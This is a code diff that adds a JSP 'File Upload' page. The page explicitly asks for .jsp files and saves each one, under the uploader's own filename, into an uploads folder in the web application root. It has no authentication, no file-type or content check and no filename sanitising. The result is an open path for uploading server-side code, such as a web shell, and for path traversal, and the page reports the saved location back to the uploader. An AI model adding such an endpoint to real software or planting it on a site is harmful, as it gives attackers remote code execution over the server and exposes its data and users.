@@ -1,0 +1,51 @@
+<%@ page import="java.io.*, java.util.*" %>
+<%@ page import="javax.servlet.http.Part" %>
+<%@ page language="java" contentType="text/html; charset=UTF-8" pageEncoding="UTF-8"%>
+<%@ page isErrorPage="false" %>
+<%@ page session="true" %>
+<!DOCTYPE html>
+<html>
+<head>
+    <title>File Upload</title>
+</head>
+<body>
+    <h1>Upload a JSP File</h1>
+    <form action="upload.jsp" method="post" enctype="multipart/form-data">
+        <label for="file">Choose JSP File:</label>
+        <input type="file" name="file" id="file" accept=".jsp"><br><br>
+        <input type="submit" value="Upload File">
+    </form>
+
+    <%
+        try {
+            if ("POST".equalsIgnoreCase(request.getMethod())) {
+                // Enable multipart handling
+                Part filePart = request.getPart("file");
+                String fileName = filePart.getSubmittedFileName();
+                String uploadPath = application.getRealPath("/") + "uploads/";
+
+                // Create uploads directory if it doesn't exist
+                File uploadDir = new File(uploadPath);
+                if (!uploadDir.exists()) {
+                    uploadDir.mkdirs();
+                }
+
+                // Save the uploaded file
+                try (InputStream inputStream = filePart.getInputStream();
+                     FileOutputStream outputStream = new FileOutputStream(uploadPath + fileName)) {
+                    byte[] buffer = new byte[1024];
+                    int bytesRead;
+                    while ((bytesRead = inputStream.read(buffer)) != -1) {
+                        outputStream.write(buffer, 0, bytesRead);
+                    }
+                    out.println("<p>File uploaded successfully to: " + uploadPath + fileName + "</p>");
+                }
+            }
+        } catch (IllegalStateException e) {
+            out.println("<p>Error: Multipart configuration is missing or file size exceeds limits.</p>");
+        } catch (Exception e) {
+            out.println("<p>Error uploading file: " + e.getMessage() + "</p>");
+        }
+    %>
+</body>
+</html>
